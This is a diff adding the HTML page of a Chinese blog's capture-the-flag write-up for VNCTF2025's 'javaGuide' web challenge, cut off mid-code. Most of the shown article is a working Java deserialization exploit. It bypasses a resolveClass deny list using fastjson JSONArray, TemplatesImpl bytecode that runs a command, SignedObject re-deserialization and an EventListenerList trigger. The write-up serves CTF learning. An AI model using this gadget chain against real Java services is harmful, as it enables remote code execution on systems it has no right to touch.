@@ -1,0 +1,806 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="EddieMurphy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言随便看看，随便打打。 SQL不想做。 javaGuide比较简单的缝合，题目给了一个反序列化入口，依赖是fastjson1.2.83，可以直接用fj原生打底。 但这里重写了resolveClass来对序列化数据进行check： 12345678910111213141516171819public class MyObjectInputStream extends ObjectInputStr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VNCTF2025-WEB">
+<meta property="og:url" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/index.html">
+<meta property="og:site_name" content="EddieMurphy&#39;s blog">
+<meta property="og:description" content="前言随便看看，随便打打。 SQL不想做。 javaGuide比较简单的缝合，题目给了一个反序列化入口，依赖是fastjson1.2.83，可以直接用fj原生打底。 但这里重写了resolveClass来对序列化数据进行check： 12345678910111213141516171819public class MyObjectInputStream extends ObjectInputStr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210004822341.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210005304971.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210005422676.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210005433478.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210144139964.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210144841158.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210144719548.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210010014143.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210010025744.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210145941925.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210010105078.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210010128026.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/308ae036c3b7f36de06fd42201641bdc.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210153054779.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210153854027.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210154001434.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210154434571.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210154358953.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210154643999.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210161426050.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210161242617.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210161342127.png">
+<meta property="article:published_time" content="2025-02-08T16:46:20.000Z">
+<meta property="article:modified_time" content="2025-02-10T08:36:02.319Z">
+<meta property="article:author" content="EddieMurphy">
+<meta property="article:tag" content="比赛">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210004822341.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>VNCTF2025-WEB - EddieMurphy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"eddiemurphy89.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>EddieMurphy&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chainsaw_man.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="VNCTF2025-WEB"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-09 00:46" pubdate>
+          2025年2月9日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">VNCTF2025-WEB</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随便看看，随便打打。</p>
+<p>SQL不想做。</p>
+<h2 id="javaGuide"><a href="#javaGuide" class="headerlink" title="javaGuide"></a>javaGuide</h2><p>比较简单的缝合，题目给了一个反序列化入口，依赖是<code>fastjson1.2.83</code>，可以直接用fj原生打底。</p>
+<p>但这里重写了<code>resolveClass</code>来对序列化数据进行check：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>, <span class="hljs-string">&quot;javax.management&quot;</span>, <span class="hljs-string">&quot;com.fasterxml.jackson&quot;</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(String denyClass : denyClasses) &#123;<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>很显然直接ban的是<code>TemplateImpl</code>和<code>BadAttributeValueExpException</code>以及<code>Jackson</code>，但是仍然有绕过的方法。</p>
+<p>首先我想到了用<code>UTF-8 Overlong Encoding</code>绕过，但是这次竟然没成功，过不了这里的<code>resolveClass</code>：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210004822341.png" srcset="/img/loading.gif" lazyload alt="image-20250210004822341"></p>
+<p>这里直接调了Jackson，可能是这个原因。</p>
+<p>绕这个<code>resolveClass</code>的常见方法还有<code>SignedObject</code>二次反序列化，但是直接打也绕不过<code>javax.management.BadAttributeValueExpException</code>，这里换一个触发的<code>EventListenerList</code>，这个来自<code>Jackson</code>原生。</p>
+<p>一调就通：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.example.javaguide.MyObjectInputStream;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br><br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc.exe&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        list.add(templates);          <span class="hljs-comment">//第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测</span><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray2.add(templates);           <span class="hljs-comment">//此时在handles这个hash表中查到了映射，后续则会以引用形式输出</span><br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd,<span class="hljs-string">&quot;val&quot;</span>,jsonArray2);<br><br>        list.add(bd);<br><br>        <span class="hljs-comment">//二次反序列化</span><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>((Serializable) list, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-comment">//触发SignedObject#getObject</span><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray1.add(signedObject);<br><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(jsonArray1);<br>        setValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br><br>        <span class="hljs-comment">//BadAttributeValueExpException bd1 = new BadAttributeValueExpException(null);</span><br>        <span class="hljs-comment">//setFieldValue(bd1,&quot;val&quot;,jsonArray1);</span><br><br><br>        <span class="hljs-comment">//验证</span><br>        <span class="hljs-type">byte</span>[] payload = ser(eventListenerList);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload_b64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(payload);<br>        System.out.println(payload_b64);<br><br>        <span class="hljs-comment">//多打两次，才能缓存成功</span><br>        <span class="hljs-comment">//try &#123;</span><br>        <span class="hljs-comment">//    des_waf(payload_b64);</span><br>        <span class="hljs-comment">//&#125; catch (Exception e)&#123;</span><br>        <span class="hljs-comment">//    ;</span><br>        <span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br>        <span class="hljs-comment">//try &#123;</span><br>        <span class="hljs-comment">//    des_waf(payload_b64);</span><br>        <span class="hljs-comment">//&#125; catch (Exception e)&#123;</span><br>        <span class="hljs-comment">//    ;</span><br>        <span class="hljs-comment">//&#125;</span><br>        <span class="hljs-comment">//Unauthorized deserialization attempt; javax.management.BadAttributeValueExpException用EventListnerList绕了</span><br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">des_normal</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">des_waf</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span 